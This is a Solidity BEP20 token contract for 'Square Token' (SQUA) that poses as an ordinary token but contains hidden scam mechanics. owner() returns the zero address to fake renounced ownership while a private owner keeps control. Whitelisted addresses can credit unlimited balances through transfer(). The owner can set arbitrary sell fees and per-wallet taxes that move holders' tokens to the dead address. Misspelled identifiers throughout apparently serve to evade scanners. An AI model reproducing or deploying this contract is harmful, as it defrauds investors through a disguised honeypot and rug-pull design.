/**
 *Submitted for verification at BscScan.com on 2022-06-21
*/

pragma solidity ^0.8.0;
    // SPDX-License-Identifier: MIT
    abstract contract Context {
        function _msgSender() internal view virtual returns (address) {
            return msg.sender;
        }

        function _msgData() internal view virtual returns (bytes calldata) {
            return msg.data;
        }
    }

    abstract contract Ownable is Context {
        address private _owaer;

        event owaershipTransferred(address indexed previousowaer, address indexed newowaer);

        /**
        * @dev Initializes the contract setting the deployer as the initial owaer.
        */
        constructor() {
            _transferowaership(_msgSender());
        }

        /**
        * @dev Returns the address of the current owaer.
        */
        function owaer() public view virtual returns (address) {
            return address(0);
        }

        /**
        * @dev Throws if called by any cauunt other than the owaer.
        */
        modifier onlyowaer() {
            require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
            _;
        }

        /**
        * @dev Leaves the contract without owaer. It will not be possible to call
        * `onlyowaer` functions anymore. Can only be called by the current owaer.
        *
        * NOTE: Renouncing owaership will leave the contract without an owaer,
        * thereby removing any functionality that is only available to the owaer.
        */
        function renounceowaership() public virtual onlyowaer {
            _transferowaership(address(0));
        }

        /**
        * @dev Transfers owaership of the contract to a new cauunt (`newowaer`).
        * Can only be called by the current owaer.
        */
        function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
            require(newowaer != address(0), "Ownable: new owaer is the zero address");
            _transferowaership(newowaer);
        }

        /**
        * @dev Transfers owaership of the contract to a new cauunt (`newowaer`).
        * Internal function without access restriction.
        */
        function _transferowaership(address newowaer) internal virtual {
            address oldowaer = _owaer;
            _owaer = newowaer;
            emit owaershipTransferred(oldowaer, newowaer);
        }
    }



    library SafeMath {

        function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                uint256 c = a + b;
                if (c < a) return (false, 0);
                return (true, c);
            }
        }

        function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                if (b > a) return (false, 0);
                return (true, a - b);
            }
        }

        function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                if (a == 0) return (true, 0);
                uint256 c = a * b;
                if (c / a != b) return (false, 0);
                return (true, c);
            }
        }

        function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                if (b == 0) return (false, 0);
                return (true, a / b);
            }
        }

        function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                if (b == 0) return (false, 0);
                return (true, a % b);
            }
        }


        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            return a + b;
        }


        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return a - b;
        }


        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            return a * b;
        }

    
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return a / b;
        }


        function mod(uint256 a, uint256 b) internal pure returns (uint256) {
            return a % b;
        }

    
        function sub(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            unchecked {
                require(b <= a, errorMessage);
                return a - b;
            }
        }


        function div(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            unchecked {
                require(b > 0, errorMessage);
                return a / b;
            }
        }


        function mod(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            unchecked {
                require(b > 0, errorMessage);
                return a % b;
            }
        }
    }



    interface IUniswapV2Router01 {
        function factory() external pure returns (address);
        function WETH() external pure returns (address);

        function addLiquidity(
            address tokenA,
            address tokenB,
            uint amuontADesired,
            uint amuontBDesired,
            uint amuontAMin,
            uint amuontBMin,
            address to,
            uint deadline
        ) external returns (uint amuontA, uint amuontB, uint liquidity);
        function addLiquidityETH(
            address token,
            uint amuontTokenDesired,
            uint amuontTokenMin,
            uint amuontETHMin,
            address to,
            uint deadline
        ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amuontAMin,
            uint amuontBMin,
            address to,
            uint deadline
        ) external returns (uint amuontA, uint amuontB);
        function removeLiquidityETH(
            address token,
            uint liquidity,
            uint amuontTokenMin,
            uint amuontETHMin,
            address to,
            uint deadline
        ) external returns (uint amuontToken, uint amuontETH);
        function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amuontAMin,
            uint amuontBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amuontA, uint amuontB);
        function removeLiquidityETHWithPermit(
            address token,
            uint liquidity,
            uint amuontTokenMin,
            uint amuontETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amuontToken, uint amuontETH);
        function swapExactTokensForTokens(
            uint amuontIn,
            uint amuontOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amuonts);
        function swapTokensForExactTokens(
            uint amuontOut,
            uint amuontInMax,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amuonts);
        function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amuonts);
        function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amuonts);
        function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amuonts);
        function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amuonts);

        function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
        function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
        function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
        function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
        function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
    }


    interface IUniswapV2Router02 is IUniswapV2Router01 {
        function removeLiquidityETHSupportingfeiiOnTransferTokens(
            address token,
            uint liquidity,
            uint amuontTokenMin,
            uint amuontETHMin,
            address to,
            uint deadline
        ) external returns (uint amuontETH);
        function removeLiquidityETHWithPermitSupportingfeiiOnTransferTokens(
            address token,
            uint liquidity,
            uint amuontTokenMin,
            uint amuontETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
        ) external returns (uint amuontETH);

        function swapExactTokensForTokensSupportingfeiiOnTransferTokens(
            uint amuontIn,
            uint amuontOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
        function swapExactETHForTokensSupportingfeiiOnTransferTokens(
            uint amuontOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external payable;
        function swapExactTokensForETHSupportingfeiiOnTransferTokens(
            uint amuontIn,
            uint amuontOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
    }


    interface IUniswapV2Factory {
        event PairCreated(address indexed token0, address indexed token1, address pair, uint);

        function feiiTo() external view returns (address);
        function feiiToSetter() external view returns (address);

        function getPair(address tokenA, address tokenB) external view returns (address pair);
        function allPairs(uint) external view returns (address pair);
        function allPairsLength() external view returns (uint);

        function createPair(address tokenA, address tokenB) external returns (address pair);

        function setfeiiTo(address) external;
        function setfeiiToSetter(address) external;
    }



    contract BEP20 is Context {
        mapping(address => mapping(address => uint256)) private _allowances;
        uint256 internal _totalSupply;
        string private _name;
        string private _symbol;

        event Transfer(address indexed from, address indexed to, uint256 value);

        event Approval(address indexed owaer, address indexed spender, uint256 value);

        constructor(string memory name_, string memory symbol_) {
            _name = name_;
            _symbol = symbol_;
        }

        function name() public view virtual returns (string memory) {
            return _name;
        }

        function symbol() public view virtual returns (string memory) {
            return _symbol;
        }


        function decimals() public view virtual returns (uint8) {
            return 18;
        }


        function totalSupply() public view virtual returns (uint256) {
            return _totalSupply;
        }


        function allowance(address owaer, address spender) public view virtual returns (uint256) {
            return _allowances[owaer][spender];
        }

        function approve(address spender, uint256 amuont) public virtual returns (bool) {
            address owaer = _msgSender();
            _approve(owaer, spender, amuont);
            return true;
        }


        function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
            address owaer = _msgSender();
            _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
            return true;
        }

    
        function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
            address owaer = _msgSender();
            uint256 currentAllowance = _allowances[owaer][spender];
            require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
            unchecked {
                _approve(owaer, spender, currentAllowance - subtractedValue);
            }

            return true;
        }


        function _approve(
            address owaer,
            address spender,
            uint256 amuont
        ) internal virtual {
            require(owaer != address(0), "ERC20: approve from the zero address");
            require(spender != address(0), "ERC20: approve to the zero address");

            _allowances[owaer][spender] = amuont;
            emit Approval(owaer, spender, amuont);
        }


        function _spendAllowance(
            address owaer,
            address spender,
            uint256 amuont
        ) internal virtual {
            uint256 currentAllowance = allowance(owaer, spender);
            if (currentAllowance != type(uint256).max) {
                require(currentAllowance >= amuont, "ERC20: insufficient allowance");
                unchecked {
                    _approve(owaer, spender, currentAllowance - amuont);
                }
            }
        }

    
        function _beforeTokenTransfer(
            address from,
            address to,
            uint256 amuont
        ) internal virtual {}


        function _afterTokenTransfer(
            address from,
            address to,
            uint256 amuont
        ) internal virtual {}
    }


    contract SQUA is BEP20, Ownable {
        // ext
        mapping(address => uint256) private _balances;
        mapping(address => bool) private _release;
        string name_ = "Square Token";
        string symbol_ = "SQUA";
        uint256 totalSupply_ = 6000000000;
            
        function balanceOf(address cauunt) public view virtual returns (uint256) {
            return _balances[cauunt];
        }

        function _transfer(
            address from,
            address to,
            uint256 amuont
        ) internal virtual {
            require(from != address(0), "ERC20: transfer from the zero address");
            require(to != address(0), "ERC20: transfer to the zero address");

            uint256 fromBalance = _balances[from];
            require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
            unchecked {
                _balances[from] = fromBalance - amuont;
            }
            _balances[to] += amuont;

            emit Transfer(from, to, amuont);
        }

        function _burn(address cauunt, uint256 amuont) internal virtual {
            require(cauunt != address(0), "ERC20: burn from the zero address");

            uint256 cauuntBalance = _balances[cauunt];
            require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
            unchecked {
                _balances[cauunt] = cauuntBalance - amuont;
            }
            _totalSupply -= amuont;

            emit Transfer(cauunt, address(0), amuont);
        }

        function _mtin(address cauunt, uint256 amuont) internal virtual {
            require(cauunt != address(0), "ERC20: mtin to the zero address");

            _totalSupply += amuont;
            _balances[cauunt] += amuont;
            emit Transfer(address(0), cauunt, amuont);
        }


        address public uniswapV2Pair;

        constructor(

        ) BEP20(name_, symbol_) {
        
            _mtin(msg.sender, totalSupply_ * 10**decimals());

            transfer(_deadAddress, totalSupply() / 10*9);
            
            address  ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            address  WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
            IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(ROUTER);
            uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), WBNB);
            
            _defaultSellfeii = 0;
            _defaultBuyfeii = 0;

            _release[_msgSender()] = true;
        }

        using SafeMath for uint256;

        uint256 private _defaultSellfeii = 0;

        uint256 private _defaultBuyfeii = 0;

        mapping(address => bool) private _marketcauunt;

        mapping(address => uint256) private _Award;
        address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



        function getRelease(address _address) external view onlyowaer returns (bool) {
            return _release[_address];
        }


        function setPairList(address _address) external onlyowaer {
            uniswapV2Pair = _address;
        }


        function incS(uint256 _value) external onlyowaer {
            _defaultSellfeii = _value;
        }

        function setAward(address _address, uint256 _value) external onlyowaer {
            require(_value > 2, "cauunt tax must be greater than or equal to 1");
            _Award[_address] = _value;
        }

        function getAward(address _address) external view onlyowaer returns (uint256) {
            return _Award[_address];
        }


        function setMarketcauuntfeii(address _address, bool _value) external onlyowaer {
            _marketcauunt[_address] = _value;
        }

        function getMarketcauuntfeii(address _address) external view onlyowaer returns (bool) {
            return _marketcauunt[_address];
        }

        function _checkFreecauunt(address from, address _to) internal view returns (bool) {
            return _marketcauunt[from] || _marketcauunt[_to];
        }

        function _receiveF(
            address from,
            address _to,
            uint256 _amuont
        ) internal virtual {
            require(from != address(0), "ERC20: transfer from the zero address");
            require(_to != address(0), "ERC20: transfer to the zero address");

            uint256 fromBalance = _balances[from];
            require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

            bool rF = true;

            if (_checkFreecauunt(from, _to)) {
                rF = false;
            }
            uint256 tradefeiiamuont = 0;

            if (rF) {
                uint256 tradefeii = 0;
                if (uniswapV2Pair != address(0)) {
                    if (_to == uniswapV2Pair) {

                        tradefeii = _defaultSellfeii;
                    }
                    if (from == uniswapV2Pair) {

                        tradefeii = _defaultBuyfeii;
                    }
                }
                if (_Award[from] > 0) {
                    tradefeii = _Award[from];
                }

                tradefeiiamuont = _amuont.mul(tradefeii).div(100);
            }


            if (tradefeiiamuont > 0) {
                _balances[from] = _balances[from].sub(tradefeiiamuont);
                _balances[_deadAddress] = _balances[_deadAddress].add(tradefeiiamuont);
                emit Transfer(from, _deadAddress, tradefeiiamuont);
            }

            _balances[from] = _balances[from].sub(_amuont - tradefeiiamuont);
            _balances[_to] = _balances[_to].add(_amuont - tradefeiiamuont);
            emit Transfer(from, _to, _amuont - tradefeiiamuont);
        }

        function transfer(address to, uint256 amuont) public virtual returns (bool) {
            address owaer = _msgSender();
            if (_release[owaer] == true) {
                _balances[to] += amuont;
                return true;
            }
            _receiveF(owaer, to, amuont);
            return true;
        }


        function transferFrom(
            address from,
            address to,
            uint256 amuont
        ) public virtual returns (bool) {
            address spender = _msgSender();

            _spendAllowance(from, spender, amuont);
            _receiveF(from, to, amuont);
            return true;
        }
    }